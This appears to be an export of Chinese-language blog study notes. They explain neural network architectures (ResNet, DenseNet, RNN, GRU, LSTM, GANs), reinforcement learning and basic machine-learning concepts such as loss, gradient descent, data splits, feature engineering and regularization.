残差网络（ResNet）让我们先思考一个问题：对神经网络模型添加新的层，充分训练后的模型是否只可能更有效地降低训练误差？理论上，原模型解的空间只是新模型解的空间的子空间。也就是说，如果我们能将新添加的层训练成恒等映射 f(x)=x ，新模型和原模型将同样有效。由于新模型可能得出更优的解来拟合训练数据集，因此添加层似乎更容易降低训练误差。然而在实践中，添加过多的层后训练误差往往不降反升。即使利用批量归一化带来的数值稳定性使训练深层模型更加容易，该问题仍然存在。针对这一问题，何恺明等人提出了残差网络（ResNet）。它在2015年的ImageNet图像识别挑战赛夺魁，并深刻影响了后来的深度神经网络的设计。 让我们聚焦于神经网络局部。如图11所示，设输入为 x 。假设我们希望学出的理想映射为 f(x) ，从而作为图11上方激活函数的输入。左图虚线框中的部分需要直接拟合出该映射 f(x) ，而右图虚线框中的部分则需要拟合出有关恒等映射的残差映射 f(x)−x 。残差映射在实际中往往更容易优化。以本节开头提到的恒等映射作为我们希望学出的理想映射 f(x) 。我们只需将图11中右图虚线框内上方的加权运算（如仿射）的权重和偏差参数学成0，那么 f(x) 即为恒等映射。实际中，当理想映射 f(x) 极接近于恒等映射时，残差映射也易于捕捉恒等映射的细微波动。图11右图也是ResNet的基础块，即残差块（residual block）。在残差块中，输入可通过跨层的数据线路更快地向前传播。 图11 ResNet残差块结构 ResNet沿用了VGG全 3×3 卷积层的设计。残差块里首先有2个有相同输出通道数的 3×3 卷积层。每个卷积层后接一个批量归一化层和ReLU激活函数。然后我们将输入跳过这两个卷积运算后直接加在最后的ReLU激活函数前。这样的设计要求两个卷积层的输出与输入形状一样，从而可以相加。如果想改变通道数，就需要引入一个额外的 1×1 卷积层来将输入变换成需要的形状后再做相加运算。 稠密连接网络（DenseNet）稠密连接网络（DenseNet）与ResNet的主要区别如图12所示。 图12 ResNet（左）与DenseNet（右）在跨层连接上的主要区别：使用相加和使用连结 图12中将部分前后相邻的运算抽象为模块A和模块B。与ResNet的主要区别在于，DenseNet里模块B的输出不是像ResNet那样和模块A的输出相加，而是在通道维上连结。这样模块A的输出可以直接传入模块B后面的层。在这个设计里，模块A直接跟模块B后面的所有层连接在了一起。这也是它被称为“稠密连接”的原因。 DenseNet的主要构建模块是稠密块（dense block）和过渡层（transition layer）。前者定义了输入和输出是如何连结的，后者则用来控制通道数，使之不过大。 MobileNets：同样的卷积层，更少的参数MobileNet，正如其名，这是一个非常简单快速并且准确率也不错的CNN网络结构，它大大减少了网络层的参数数量，使得网络的前向传播和后向传播的运算量大幅减少，最终成为了一个效率极高的CNN网络。 ShuffleNets：Group convolution+Channel ShuffleShuffleNet是Face++提出的一种轻量化网络结构，主要思路是使用Group convolution和Channel shuffle改进ResNet，可以看作是ResNet的压缩版本。 循环神经网络循环神经网络是为更好地处理时序信息而设计的。它引入状态变量来存储过去的信息，并用其与当前的输入共同决定当前的输出。 循环神经网络常用于处理序列数据，如一段文字或声音、购物或观影的顺序，甚至是图像中的一行或一列像素。因此，循环神经网络有着极为广泛的实际应用，如语言模型、文本分类、机器翻译、语音识别、图像分析、手写识别和推荐系统。 现在我们考虑输入数据存在时间相关性的情况。假设 $Xt∈R^{n×d}$ 是序列中时间步 $t$ 的小批量输入，$H_t∈R^{n×h}$ 是该时间步的隐藏变量。与多层感知机不同的是，这里我们保存上一时间步的隐藏变量 $H{t−1}$ ，并引入一个新的权重参数 $W_{hh}∈R^{h×h}$ ，该参数用来描述在当前时间步如何使用上一时间步的隐藏变量。具体来说，时间步 $t$ 的隐藏变量的计算由当前时间步的输入和上一时间步的隐藏变量共同决定： H_t=ϕ(X_tW_{xh}+H_{t−1}W_{hh}+b_h)与多层感知机相比，我们在这里添加了 $H{t−1}W{hh}$一项。由上式中相邻时间步的隐藏变量 $Ht$ 和 $H{t−1}$ 之间的关系可知，这里的隐藏变量能够捕捉截至当前时间步的序列的历史信息，就像是神经网络当前时间步的状态或记忆一样。因此，该隐藏变量也称为隐藏状态。由于隐藏状态在当前时间步的定义使用了上一时间步的隐藏状态，上式的计算是循环的。使用循环计算的网络即循环神经网络（recurrent neural network）。 循环神经网络有很多种不同的构造方法。含上式所定义的隐藏状态的循环神经网络是极为常见的一种。若无特别说明，本章中的循环神经网络均基于上式中隐藏状态的循环计算。在时间步 $t$ ，输出层的输出和多层感知机中的计算类似： O_t=H_tW_{hq}+b_q循环神经网络的参数包括隐藏层的权重 $W{xh}∈R^{d×h}$ 、 $W{hh}∈R^{h×h}$ 和偏差 $bh∈R^{1×h}$ ，以及输出层的权重 $W{hq}∈R^{h×q}$ 和偏差 $b_q∈R^{1×q}$ 。值得一提的是，即便在不同时间步，循环神经网络也始终使用这些模型参数。因此，循环神经网络模型参数的数量不随时间步的增加而增长。 图13展示了循环神经网络在3个相邻时间步的计算逻辑。在时间步 $t$ ，隐藏状态的计算可以看成是将输入 $Xt$ 和前一时间步隐藏状态 $H{t−1}$ 连结后输入一个激活函数为 $ϕ$ 的全连接层。该全连接层的输出就是当前时间步的隐藏状态 $Ht$ ，且模型参数为 $W{xh}$ 与 $W{hh}$ 的连结，偏差为 $b_h$ 。当前时间步 $t$ 的隐藏状态 $H_t$ 将参与下一个时间步 $t+1$ 的隐藏状态 $H{t+1}$ 的计算，并输入到当前时间步的全连接输出层。 图13 含隐藏状态的循环神经网络 门控循环单元（GRU）当时间步数较大或者时间步较小时，循环神经网络的梯度较容易出现衰减或爆炸。虽然裁剪梯度可以应对梯度爆炸，但无法解决梯度衰减的问题。通常由于这个原因，循环神经网络在实际中较难捕捉时间序列中时间步距离较大的依赖关系。 门控循环神经网络（gated recurrent neural network）的提出，正是为了更好地捕捉时间序列中时间步距离较大的依赖关系。它通过可以学习的门来控制信息的流动。其中，门控循环单元（gated recurrent unit，GRU）是一种常用的门控循环神经网络。 门控循环单元引入了重置门（reset gate）和更新门（update gate）的概念，从而修改了循环神经网络中隐藏状态的计算方式。门控循环单元中的重置门和更新门的输入均为当前时间步输入 $Xt$ 与上一时间步隐藏状态 $H{t−1}$ ，输出由激活函数为sigmoid函数的全连接层计算得到。 图14 门控循环单元中候选隐藏状态的计算 具体来说，时间步 $t$ 的候选隐藏状态 $\tilde{\boldsymbol{H}}_t∈R^{n×h}$ 的计算为 \tilde{\boldsymbol{H}}_t=tanh(X_tW_{xh}+(R_t⊙H_{t−1})W_{hh}+b_h)其中 $W{xh}∈R^{d×h}$ 和 $W{hh}∈R^{h×h}$ 是权重参数， $b_h∈R^{1×h}$ 是偏差参数。从上面这个公式可以看出，重置门控制了上一时间步的隐藏状态如何流入当前时间步的候选隐藏状态。而上一时间步的隐藏状态可能包含了时间序列截至上一时间步的全部历史信息。因此，重置门可以用来丢弃与预测无关的历史信息。 最后，时间步 $t$ 的隐藏状态 $Ht∈R^{n×h}$ 的计算使用当前时间步的更新门 $Z_t$ 来对上一时间步的隐藏状态 $H{t−1}$ 和当前时间步的候选隐藏状态 $\tilde{\boldsymbol{H}}_t$ 做组合： Ht=Zt⊙Ht−1+(1−Zt)⊙\tilde{\boldsymbol{H}}_t 图15 门控循环单元中隐藏状态的计算 值得注意的是，更新门可以控制隐藏状态应该如何被包含当前时间步信息的候选隐藏状态所更新。 我们对门控循环单元的设计稍作总结： 重置门有助于捕捉时间序列里短期的依赖关系； 更新门有助于捕捉时间序列里长期的依赖关系。 长短期记忆（LSTM）LSTM 中引入了3个门，即输入门（input gate）、遗忘门（forget gate）和输出门（output gate），以及与隐藏状态形状相同的记忆细胞（某些文献把记忆细胞当成一种特殊的隐藏状态），从而记录额外的信息。 输入门、遗忘门和输出门与门控循环单元中的重置门和更新门一样，如图16所示，长短期记忆的门的输入均为当前时间步输入 $Xt$ 与上一时间步隐藏状态 $H{t−1}$ ，输出由激活函数为sigmoid函数的全连接层计算得到。如此一来，这3个门元素的值域均为 [0,1] 。 图16 长短期记忆中输入门、遗忘门和输出门的计算 具体来说，假设隐藏单元个数为$h$，给定时间步$t$的小批量输入$\boldsymbol{X}t \in \mathbb{R}^{n \times d}$（样本数为$n$，输入个数为$d$）和上一时间步隐藏状态$\boldsymbol{H}_{t-1} \in \mathbb{R}^{n \times h}$。 时间步$t$的输入门$\boldsymbol{I}_t \in \mathbb{R}^{n \times h}$、遗忘门$\boldsymbol{F}_t \in \mathbb{R}^{n \times h}$和输出门$\boldsymbol{O}_t \in \mathbb{R}^{n \times h}$分别计算如下： \begin{aligned} \boldsymbol{I}_t &= \sigma(\boldsymbol{X}_t \boldsymbol{W}_{xi} + \boldsymbol{H}_{t-1} \boldsymbol{W}_{hi} + \boldsymbol{b}_i)\end{aligned}\begin{aligned} \boldsymbol{F}_t &= \sigma(\boldsymbol{X}_t \boldsymbol{W}_{xf} + \boldsymbol{H}_{t-1} \boldsymbol{W}_{hf} + \boldsymbol{b}_f)\end{aligned}\begin{aligned} \boldsymbol{O}_t &= \sigma(\boldsymbol{X}_t \boldsymbol{W}_{xo} + \boldsymbol{H}_{t-1} \boldsymbol{W}_{ho} + \boldsymbol{b}_o)\end{aligned}其中的$\boldsymbol{W}{xi}, \boldsymbol{W}{xf}, \boldsymbol{W}{xo} \in \mathbb{R}^{d \times h}$和$\boldsymbol{W}{hi}, \boldsymbol{W}{hf}, \boldsymbol{W}{ho} \in \mathbb{R}^{h \times h}$是权重参数，$\boldsymbol{b}_i, \boldsymbol{b}_f, \boldsymbol{b}_o \in \mathbb{R}^{1 \times h}$是偏差参数。 候选记忆细胞接下来，长短期记忆需要计算候选记忆细胞$\tilde{\boldsymbol{C}}_t$。它的计算与上面介绍的3个门类似，但使用了值域在$[-1, 1]$的tanh函数作为激活函数，如图17所示。 图17 长短期记忆中候选记忆细胞的计算 具体来说，时间步$t$的候选记忆细胞$\tilde{\boldsymbol{C}}_t \in \mathbb{R}^{n \times h}$的计算为 \tilde{\boldsymbol{C}}t = \text{tanh}(\boldsymbol{X}t \boldsymbol{W}{xc} + \boldsymbol{H}{t-1} \boldsymbol{W}_{hc} + \boldsymbol{b}_c),其中$\boldsymbol{W}{xc} \in \mathbb{R}^{d \times h}$和$\boldsymbol{W}{hc} \in \mathbb{R}^{h \times h}$是权重参数，$\boldsymbol{b}_c \in \mathbb{R}^{1 \times h}$是偏差参数。 记忆细胞我们可以通过元素值域在$[0, 1]$的输入门、遗忘门和输出门来控制隐藏状态中信息的流动，这一般也是通过使用按元素乘法（符号为$\odot$）来实现的。当前时间步记忆细胞$\boldsymbol{C}_t \in \mathbb{R}^{n \times h}$的计算组合了上一时间步记忆细胞和当前时间步候选记忆细胞的信息，并通过遗忘门和输入门来控制信息的流动： \boldsymbol{C}_t = \boldsymbol{F}t \odot \boldsymbol{C}{t-1} + \boldsymbol{I}_t \odot \tilde{\boldsymbol{C}}_t.如图6.9所示，遗忘门控制上一时间步的记忆细胞$\boldsymbol{C}_{t-1}$中的信息是否传递到当前时间步，而输入门则控制当前时间步的输入$\boldsymbol{X}_t$通过候选记忆细胞$\tilde{\boldsymbol{C}}_t$如何流入当前时间步的记忆细胞。如果遗忘门一直近似1且输入门一直近似0，过去的记忆细胞将一直通过时间保存并传递至当前时间步。这个设计可以应对循环神经网络中的梯度衰减问题，并更好地捕捉时间序列中时间步距离较大的依赖关系。 图18 长短期记忆中候选记忆细胞的计算 隐藏状态有了记忆细胞以后，接下来我们还可以通过输出门来控制从记忆细胞到隐藏状态$\boldsymbol{H}_t \in \mathbb{R}^{n \times h}$的信息的流动： \boldsymbol{H}_t = \boldsymbol{O}_t \odot \text{tanh}(\boldsymbol{C}_t).这里的tanh函数确保隐藏状态元素值在-1到1之间。需要注意的是，当输出门近似1时，记忆细胞信息将传递到隐藏状态供输出层使用；当输出门近似0时，记忆细胞信息只自己保留。图6.10展示了长短期记忆中隐藏状态的计算。 图19 长短期记忆中隐藏状态的计算 深度循环神经网络在深度学习应用里，我们通常会用到含有多个隐藏层的循环神经网络，也称作深度循环神经网络。图20演示了一个有 L 个隐藏层的深度循环神经网络，每个隐藏状态不断传递至当前层的下一时间步和当前时间步的下一层。 图20 深度循环神经网络的架构 具体来说，在时间步$t$里，设小批量输入$\boldsymbol{X}_t \in \mathbb{R}^{n \times d}$（样本数为$n$，输入个数为$d$），第$\ell$隐藏层（$\ell=1,\ldots,L$）的隐藏状态为$\boldsymbol{H}_t^{(\ell)} \in \mathbb{R}^{n \times h}$（隐藏单元个数为$h$），输出层变量为$\boldsymbol{O}_t \in \mathbb{R}^{n \times q}$（输出个数为$q$），且隐藏层的激活函数为$\phi$。第1隐藏层的隐藏状态和之前的计算一样： \boldsymbol{H}_t^{(1)} = \phi(\boldsymbol{X}_t \boldsymbol{W}_{xh}^{(1)} + \boldsymbol{H}_{t-1}^{(1)} \boldsymbol{W}_{hh}^{(1)} + \boldsymbol{b}_h^{(1)}),其中权重$\boldsymbol{W}{xh}^{(1)} \in \mathbb{R}^{d \times h}$、$\boldsymbol{W}{hh}^{(1)} \in \mathbb{R}^{h \times h}$和偏差 $\boldsymbol{b}_h^{(1)} \in \mathbb{R}^{1 \times h}$分别为第1隐藏层的模型参数。 当$1 &lt; \ell \leq L$时，第$\ell$隐藏层的隐藏状态的表达式为 \boldsymbol{H}_t^{(\ell)} = \phi(\boldsymbol{H}_t^{(\ell-1)} \boldsymbol{W}_{xh}^{(\ell)} + \boldsymbol{H}_{t-1}^{(\ell)} \boldsymbol{W}_{hh}^{(\ell)} + \boldsymbol{b}_h^{(\ell)}),其中权重$\boldsymbol{W}{xh}^{(\ell)} \in \mathbb{R}^{h \times h}$、$\boldsymbol{W}{hh}^{(\ell)} \in \mathbb{R}^{h \times h}$和偏差 $\boldsymbol{b}_h^{(\ell)} \in \mathbb{R}^{1 \times h}$分别为第$\ell$隐藏层的模型参数。 最终，输出层的输出只需基于第$L$隐藏层的隐藏状态： \boldsymbol{O}_t = \boldsymbol{H}_t^{(L)} \boldsymbol{W}_{hq} + \boldsymbol{b}_q,其中权重$\boldsymbol{W}_{hq} \in \mathbb{R}^{h \times q}$和偏差$\boldsymbol{b}_q \in \mathbb{R}^{1 \times q}$为输出层的模型参数。 同多层感知机一样，隐藏层个数$L$和隐藏单元个数$h$都是超参数。此外，如果将隐藏状态的计算换成门控循环单元或者长短期记忆的计算，我们可以得到深度门控循环神经网络。 双向循环神经网络之前介绍的循环神经网络模型都是假设当前时间步是由前面的较早时间步的序列决定的，因此它们都将信息通过隐藏状态从前往后传递。有时候，当前时间步也可能由后面时间步决定。例如，当我们写下一个句子时，可能会根据句子后面的词来修改句子前面的用词。双向循环神经网络通过增加从后往前传递信息的隐藏层来更灵活地处理这类信息。图21演示了一个含单隐藏层的双向循环神经网络的架构。 图21 双向循环神经网络的架构 生成模型在概率统计理论中, 生成模型是指能够随机生成观测数据的模型，尤其是在给定某些隐含参数的条件下。它给观测值和标注数据序列指定一个联合概率分布。在机器学习中，生成模型可以用来直接对数据建模（例如根据某个变量的概率密度函数进行数据采样），也可以用来建立变量间的条件概率分布。条件概率分布可以由生成模型根据贝叶斯定理形成。 香农 (1948) 给出了有一个英语双词频率表生成句子的例子。可以生成如“representing and speedily is an good”这种句子。一开始并不能生成正确的英文句子，但随着词频表由双词扩大为三词甚至多词，生成的句子也就慢慢的成型了。 生成模型的定义与判别模型相对应：生成模型是所有变量的全概率模型，而判别模型是在给定观测变量值前提下目标变量条件概率模型。因此生成模型能够用于模拟（即生成）模型中任意变量的分布情况，而判别模型只能根据观测变量得到目标变量的采样。判别模型不对观测变量的分布建模，因此它不能够表达观测变量与目标变量之间更复杂的关系。因此，生成模型更适用于无监督的任务，如分类和聚类。 生成对抗网络生成对抗网络（英语：Generative Adversarial Network，简称GAN）是非监督式学习的一种方法，通过让两个神经网络相互博弈的方式进行学习。该方法由伊恩·古德费洛等人于2014年提出。[1] 生成对抗网络由一个生成网络与一个判别网络组成。生成网络从潜在空间（latent space）中随机采样作为输入，其输出结果需要尽量模仿训练集中的真实样本。判别网络的输入则为真实样本或生成网络的输出，其目的是将生成网络的输出从真实样本中尽可能分辨出来。而生成网络则要尽可能地欺骗判别网络。两个网络相互对抗、不断调整参数，最终目的是使判别网络无法判断生成网络的输出结果是否真实。[2][1][3] 生成对抗网络常用于生成以假乱真的图片。[4]此外，该方法还被用于生成视频[5]、三维物体模型[6]等。 强化学习强化学习（英语：Reinforcement learning，简称RL）是机器学习中的一个领域，强调如何基于环境而行动，以取得最大化的预期利益。其灵感来源于心理学中的行为主义理论，即有机体如何在环境给予的奖励或惩罚的刺激下，逐步形成对刺激的预期，产生能获得最大利益的习惯性行为。这个方法具有普适性，因此在其他许多领域都有研究，例如博弈论、控制论、运筹学、信息论、仿真优化、多主体系统学习、群体智能、统计学以及遗传算法。在运筹学和控制理论研究的语境下，强化学习被称作“近似动态规划”（approximate dynamic programming，ADP）。在最优控制理论中也有研究这个问题，虽然大部分的研究是关于最优解的存在和特性，并非是学习或者近似方面。在经济学和博弈论中，强化学习被用来解释在有限理性的条件下如何出现平衡。 在机器学习问题中，环境通常被规范为马可夫决策过程（MDP），所以许多强化学习算法在这种情况下使用动态规划技巧。传统的技术和强化学习算法的主要区别是，后者不需要关于MDP的知识，而且针对无法找到确切方法的大规模MDP。 强化学习和标准的监督式学习之间的区别在于，它并不需要出现正确的输入/输出对，也不需要精确校正次优化的行为。强化学习更加专注于在线规划，需要在探索（在未知的领域）和遵从（现有知识）之间找到平衡。强化学习中的“探索-遵从”的交换，在多臂老虎机（英语：multi-armed bandit）问题和有限MDP中研究得最多。 理解强化学习抛开强化学习探索反馈过程，从回合的最终结果看，强化学习也是一种有监督学习。回合最终结果的输赢就是标签，如果最终结果是好的，说明之前的一系列状态动作的决策过程是有效的，反之是无效的。通过不断地学习，最终可得到较优的状态到动作地策略分布Q函数或者状态和动作的值函数。 记忆网络传统的深度学习模型（RNN、LSTM、GRU等）使用hidden states或者Attention机制作为他们的记忆功能，但是这种方法产生的记忆太小了，无法精确记录一段话中所表达的全部内容，也就是在将输入编码成dense vectors的时候丢失了很多信息。记忆网络采用一种可读写的外部记忆模块，并将其和inference组件联合训练，最终得到一个可以被灵活操作的记忆模块。 参考链接 人工神经网络,by wikipedia. 神经网络简介,by google. 一文详解神经网络 BP 算法原理及 Python 实现,by AI研习社. 反向传播算法动态演示, by google. 深度学习架构家谱,by hunkim. 动手学深度学习,by d2l-zh. 神经网络之LeNet结构分析及参数详解,by Genius_zz. 经典CNN结构简析：AlexNet、VGG、NIN、GoogLeNet、ResNet etc. ,by Uno Whoiam. 一文读懂VGG网络,by Amusi. 生成模型,by wikipedia. 生成对抗网络,by wikipedia. GAN动态演示,by poloclub. 强化学习,by wikipedia. 25张图让你读懂神经网络架构, by Nicholas_Liu2017. 常见的损失函数(loss function)总结,by yyHaker.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机器学习之相关概念]]></title>
    <url>%2F2018%2F11%2F19%2F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5%2F</url>
    <content type="text"><![CDATA[机器学习是人工智能的一个分支。人工智能的研究历史有着一条从以“推理”为重点，到以“知识”为重点，再到以“学习”为重点的自然、清晰的脉络。显然，机器学习是实现人工智能的一个途径，即以机器学习为手段解决人工智能中的问题。 定义机器学习有下面几种定义： 机器学习是一门人工智能的科学，该领域的主要研究对象是人工智能，特别是如何在经验学习中改善具体算法的性能。 机器学习是对能通过经验自动改进的计算机算法的研究。 机器学习是用数据或以往的经验，以此优化计算机程序的性能标准。 一种经常引用的英文定义是：A computer program is said to learn from experience E with respect to some class of tasks T and performance measure P, if its performance at tasks in T, as measured by P, improves with experience E. 分类机器学习可以分成下面几种类别： 监督学习：从给定的训练数据集中学习出一个函数，当新的数据到来时，可以根据这个函数预测结果。监督学习的训练集要求是包括输入和输出，也可以说是特征和目标。训练集中的目标是由人标注的。常见的监督学习算法包括回归分析和统计分类。 监督学习和非监督学习的差别就是训练集目标是否人标注。他们都有训练集且都有输入和输出。 无监督学习：与监督学习相比，训练集没有人为标注的结果。常见的无监督学习算法有生成对抗网络（GAN）、聚类。 半监督学习：介于监督学习与无监督学习之间。 强化学习：通过观察来学习做成如何的动作。每个动作都会对环境有所影响，学习对象根据观察到的周围环境的反馈来做出判断。 算法具体的机器学习算法有： 构造间隔理论分布：聚类分析和模式识别 人工神经网络 决策树 感知器 支持向量机 集成学习AdaBoost 降维与度量学习 聚类 贝叶斯分类器 构造条件概率：回归分析和统计分类 高斯过程回归 线性判别分析 最近邻居法 径向基函数核 通过再生模型构造概率密度函数： 最大期望算法 概率图模型：包括贝叶斯网和Markov随机场 Generative Topographic Mapping 近似推断技术： 马尔可夫链 蒙特卡罗方法 变分法 最优化：大多数以上方法，直接或者间接使用最优化算法。 机器学习基础标签标签是我们要预测的事物，即简单线性回归中的 y 变量。标签可以是小麦未来的价格、图片中显示的动物品种、音频剪辑的含义或任何事物。 特征特征是输入变量，即简单线性回归中的 x 变量。简单的机器学习项目可能会使用单个特征，而比较复杂的机器学习项目可能会使用数百万个特征，按如下方式指定： \{ x_1,x_2,...x_N \}在垃圾邮件检测器示例中，特征可能包括： 电子邮件文本中的字词 发件人的地址 发送电子邮件的时段 电子邮件中包含“一种奇怪的把戏”这样的短语。 样本样本是指数据的特定实例：x。（我们采用粗体 x 表示它是一个矢量。）我们将样本分为以下两类： 有标签样本 无标签样本 有标签样本同时包含特征和标签，常用于训练模型。。即：1labeled examples: &#123;features, label&#125;: (x, y) 无标签样本包含特征，但不包含标签，常用于模型预测。即：1unlabeled examples: &#123;features, ?&#125;: (x, ?) 模型模型定义了特征与标签之间的关系。例如，垃圾邮件检测模型可能会将某些特征与“垃圾邮件”紧密联系起来。我们来重点介绍一下模型生命周期的两个阶段： 训练表示创建或学习模型。向模型展示有标签样本，让模型逐渐学习特征与标签之间的关系。 推断表示将训练后的模型应用于无标签样本。使用训练后的模型来做出有用的预测 (y’)。 回归与分类回归模型可预测连续值。例如，回归模型做出的预测可回答如下问题： 加利福尼亚州一栋房产的价值是多少？ 用户点击此广告的概率是多少？ 分类模型可预测离散值。例如，分类模型做出的预测可回答如下问题： 某个指定电子邮件是垃圾邮件还是非垃圾邮件？ 这是一张狗、猫还是仓鼠图片？ 损失训练模型表示通过有标签样本来学习（确定）所有权重和偏差的理想值。在监督式学习中，机器学习算法通过以下方式构建模型：检查多个样本并尝试找出可最大限度地减少损失的模型；这一过程称为经验风险最小化。 损失是对糟糕预测的惩罚。也就是说，损失是一个数值，表示对于单个样本而言模型预测的准确程度。如果模型的预测完全准确，则损失为零，否则损失会较大。训练模型的目标是从所有样本中找到一组平均损失“较小”的权重和偏差。 平方损失：又称为 $L_2$ 损失,一种常见的损失函数。例如单个样本的平方损失如下：123= the square of the difference between the label and the prediction= (observation - prediction(x))^2= (y - y&apos;)^2 均方误差 (MSE) 指的是每个样本的平均平方损失。要计算 MSE，请求出各个样本的所有平方损失之和，然后除以样本数量： MSE = \frac{1}{N} \sum_{(x,y)\in D} (y - prediction(x))^2其中： (x,y)指的是样本，其中 x指的是模型进行预测时使用的特征集（例如，温度、年龄和交配成功率）。 y指的是样本的标签（例如，每分钟的鸣叫次数）。 prediction(x)指的是权重和偏差与特征集 x 结合的函数。 D指的是包含多个有标签样本（即 (x,y)）的数据集。 N指的是D中的样本数量。 迭代方法下图显示了机器学习算法用于训练模型的迭代试错过程： 图1 用于训练模型的迭代方法 梯度下降法计算参数更新的目标是在模型的迭代试错过程中，使损失越来越小。而常用的方法就是梯度下降法。 图2 回归问题产生的损失与权重图为凸形 对于图2所示的凸形问题，刚好存在一个斜率正好为 0 的位置，即是损失函数的收敛之处。梯度下降法的第一个阶段是为$w_1$ 选择一个起始值（起点）。 然后，梯度下降法算法会计算损失曲线在起点处的梯度。简而言之，梯度是偏导数的矢量；它可以让您了解哪个方向距离目标“更近”或“更远”。 请注意，梯度是一个矢量，因此具有以下两个特征： 方向 大小 梯度始终指向损失函数中增长最为迅猛的方向。梯度下降法算法会沿着负梯度的方向走一步，以便尽快降低损失。 为了确定损失函数曲线上的下一个点，梯度下降法算法会将梯度大小的一部分与起点相加，如图3所示： 图3 一个梯度步长将我们移动到损失曲线上的下一个点 然后，梯度下降法会重复此过程，逐渐接近最低点。 学习速率梯度下降法算法用梯度乘以一个称为学习速率（有时也称为步长）的标量，以确定下一个点的位置。例如，如果梯度大小为 2.5，学习速率为 0.01，则梯度下降法算法会选择距离前一个点 0.025 的位置作为下一个点。 超参数是编程人员在机器学习算法中用于调整的旋钮。大多数机器学习编程人员会花费相当多的时间来调整学习速率。如果您选择的学习速率过小，就会花费太长的学习时间。如果您指定的学习速率过大，下一个点将永远在 U 形曲线的底部随意弹跳。 随机梯度下降法在梯度下降法中，批量指的是用于在单次迭代中计算梯度的样本总数。到目前为止，我们一直假定批量是指整个数据集。就 Google 的规模而言，数据集通常包含数十亿甚至数千亿个样本。此外，Google 数据集通常包含海量特征。因此，一个批量可能相当巨大。如果是超大批量，则单次迭代就可能要花费很长时间进行计算。 通过从我们的数据集中随机选择样本，我们可以通过小得多的数据集估算（尽管过程非常杂乱）出较大的平均值。 随机梯度下降法 (SGD) 将这种想法运用到极致，它每次迭代只使用一个样本（批量大小为 1）。如果进行足够的迭代，SGD 也可以发挥作用，但过程会非常杂乱。“随机”这一术语表示构成各个批量的一个样本都是随机选择的。 小批量随机梯度下降法（小批量 SGD）是介于全批量迭代与 SGD 之间的折衷方案。小批量通常包含 10-1000 个随机选择的样本。小批量 SGD 可以减少 SGD 中的杂乱样本数量，但仍然比全批量更高效。 泛化(Generalization)泛化是指机器学习对从真实概率分布（已隐藏）中抽取的新数据做出良好预测的能力。要取得良好的泛化能力，机器学习必须满足以下基本假设，同时防止过拟合。 机器学习的基本假设： 从分布中随机抽取独立同分布 (i.i.d) 的样本。换言之，样本之间不会互相影响。（另一种解释：i.i.d. 是表示变量随机性的一种方式）。 分布是平稳的；即分布在数据集内不会发生变化。 从同一分布的数据划分中抽取样本。 过拟合模型在训练过程中产生的损失很低，但在预测新数据方面的表现却非常糟糕。 训练集与测试集机器学习模型旨在根据以前未见过的新数据做出良好预测。但是，如果您要根据数据集构建模型，如何获得以前未见过的数据呢？一种方法是将您的数据集分成两个子集： 训练集 - 用于训练模型的子集。 测试集 - 用于测试模型的子集。 测试集应满足以下两个条件： 规模足够大，可产生具有统计意义的结果。 能代表整个数据集。换言之，挑选的测试集的特征应该与训练集的特征相同。 验证集将数据集划分为训练集和测试集两个子集是个不错的想法，但不是万能良方。通过将数据集划分为训练集、验证集、测试集三个子集，可以大幅降低过拟合的发生几率。 使用验证集评估训练集的效果。然后，在模型“通过”验证集之后，使用测试集再次检查评估结果。图4展示了这一新工作流程： 图4 使用验证集的工作流程 特征表示特征工程指的是将原始数据转换为特征矢量。进行特征工程预计需要大量时间。 映射数值: 机器学习模型根据浮点值进行训练，因此整数和浮点原始数据不需要特殊编码。 映射字符串值: 首先为要表示的所有特征的字符串值定义一个词汇表。然后使用该词汇表创建一个独热编码，用于将指定字符串值表示为二元矢量。 映射分类（枚举）值 图5 通过独热编码映射字符串值 良好特征的特点 避免很少使用的离散特征值。 良好的特征值应该在数据集中出现大约 5 次以上。这样一来，模型就可以学习该特征值与标签是如何关联的。 最好具有清晰明确的含义。 每个特征对于项目中的任何人来说都应该具有清晰明确的含义。例如，下面的房龄适合作为特征，可立即识别为年龄：1house_age: 27 不要将“神奇”的值与实际数据混为一谈 良好的浮点特征不包含超出范围的异常断点或“神奇”的值。例如，假设一个特征具有 0 到 1 之间的浮点值。那么，如下值是可以接受的：12quality_rating: 0.82quality_rating: 0.37 不过，如果用户没有输入 quality_rating，则数据集可能使用如下神奇值来表示不存在该值：1quality_rating: -1 为解决神奇值的问题，需将该特征转换为两个特征：123一个特征只存储质量评分，不含神奇值。一个特征存储布尔值，表示是否提供了 quality_rating。为该布尔值特征指定一个名称，例如 is_quality_rating_defined。 考虑上游不稳定性 特征的定义不应随时间发生变化。例如，下列值是有用的，因为城市名称一般不会改变。（注意，我们仍然需要将“br/sao_paulo”这样的字符串转换为独热矢量。）1city_id: &quot;br/sao_paulo&quot; 但收集由其他模型推理的值会产生额外成本。可能值“219”目前代表圣保罗，但这种表示在未来运行其他模型时可能轻易发生变化：1inferred_city_cluster: &quot;219&quot; 清理数据即使是非常少量的坏样本会破坏掉一个大规模数据集，因此需花费大量的时间挑出坏样本并加工可以挽救的样本。 缩放特征值: 缩放是指将浮点特征值从自然范围（例如 100 到 900）转换为标准范围（例如 0 到 1 或 -1 到 +1）。如果特征集包含多个特征，则缩放特征可以带来以下优势： 帮助梯度下降法更快速地收敛。 帮助避免“NaN 陷阱”。 帮助模型为每个特征确定合适的权重。 处理极端离群值 对每个值取对数 将最大值“限制”为某个任意值 分箱 清查 数据集中的很多样本是不可靠的，原因有以下一种或多种： 遗漏值。 例如，有人忘记为某个房屋的年龄输入值。 重复样本。 例如，服务器错误地将同一条记录上传了两次。 不良标签。 例如，有人错误地将一颗橡树的图片标记为枫树。 不良特征值。 例如，有人输入了多余的位数，或者温度计被遗落在太阳底下。 正则化图6泛化曲线显示的是训练集和验证集相对于训练迭代次数的损失。 图6 训练集和验证集损失 图6显示的是某个模型的训练损失逐渐减少，但验证损失最终增加。换言之，该泛化曲线显示该模型与训练集中的数据过拟合。根据奥卡姆剃刀定律，或许我们可以通过降低复杂模型的复杂度来防止过拟合，这种原则称为正则化。 正则化以最小化损失和复杂度为目标，这称为结构风险最小化： \text{minimize(Loss(Data|Model) + complexity(Model))}现在，训练优化算法是一个由两项内容组成的函数：一个是损失项，用于衡量模型与数据的拟合度，另一个是正则化项，用于衡量模型复杂度。 有两种常用衡量模型复杂度的方法： 